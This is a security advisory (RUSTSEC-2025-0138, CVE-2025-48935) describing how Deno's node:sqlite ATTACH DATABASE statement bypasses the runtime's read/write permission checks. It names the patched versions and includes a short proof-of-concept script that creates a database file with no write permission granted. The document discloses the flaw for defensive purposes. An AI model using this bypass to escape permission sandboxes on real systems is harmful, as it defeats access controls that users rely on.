```toml
[advisory]
id = "RUSTSEC-2025-0138"
package = "deno"
date = "2025-06-03"
url = "https://github.com/denoland/deno/security/advisories/GHSA-8vxj-4cph-c596"
references = ["https://github.com/denoland/deno/commit/31a97803995bd94629528ba841b2418d3ca01860"]
cvss = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P"
keywords = ["read/write bypass"]
aliases = ["CVE-2025-48935", "GHSA-8vxj-4cph-c596"]
license = "CC-BY-4.0"

[versions]
patched = [">= 2.2.5"]
unaffected = ["< 2.2.0"]
```

# --allow-read / --allow-write permission bypass in `node:sqlite`

It is possible to bypass Deno's read/write permission
checks by using ATTACH DATABASE statement.

## PoC

```
// poc.js
import { DatabaseSync } from "node:sqlite"

const db = new DatabaseSync(":memory:");
db.exec("ATTACH DATABASE 'test.db' as test;");

db.exec("CREATE TABLE test.test (id INTEGER PRIMARY KEY, name TEXT);");
```

```
$ deno poc.js
```
